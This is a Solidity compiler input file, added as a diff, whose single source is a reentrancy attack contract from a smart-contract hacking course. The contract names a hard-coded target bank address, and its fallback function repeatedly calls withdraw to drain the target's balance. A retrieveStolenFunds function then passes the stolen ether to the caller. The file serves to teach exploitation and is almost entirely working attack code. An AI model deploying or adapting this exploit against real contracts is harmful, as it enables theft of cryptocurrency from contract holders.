@@ -1,0 +1,29 @@
+{
+  "language": "Solidity",
+  "settings": {
+    "libraries": {},
+    "metadata": {
+      "useLiteralContent": true
+    },
+    "optimizer": {
+      "enabled": false,
+      "runs": 200
+    },
+    "remappings": [],
+    "outputSelection": {
+      "*": {
+        "*": [
+          "*"
+        ],
+        "": [
+          "*"
+        ]
+      }
+    }
+  },
+  "sources": {
+    "browser/Attack.sol": {
+      "content": "/// Console Cowboys Smart Contract Hacking Course\n/// @author Olie Brown @ficti0n\n/// http://cclabs.io \n\ninterface targetInterface{\n    function deposit() external payable; \n    function withdraw(uint withdrawAmount) external; \n}\n\ncontract simpleReentrancyAttack{\n    targetInterface bankAddress = targetInterface(0x11a416891C5d7a2066164a6edC3Bc3B478F47720); \n    uint amount = 0.01 ether; \n\n\n    function deposit() public payable{\n        bankAddress.deposit.value(amount)();\n    }\n    \n    function getTargetBalance() public view returns(uint){\n        return address(bankAddress).balance; \n    }\n    function attack() public payable{\n        bankAddress.withdraw(amount); \n    }\n    \n    function retrieveStolenFunds() public {\n        msg.sender.transfer(address(this).balance);\n    }\n    \n    fallback () external payable{ \n     if (address(bankAddress).balance >= amount){\n         bankAddress.withdraw(amount);\n     }   \n    }\n}"
+    }
+  }
+}
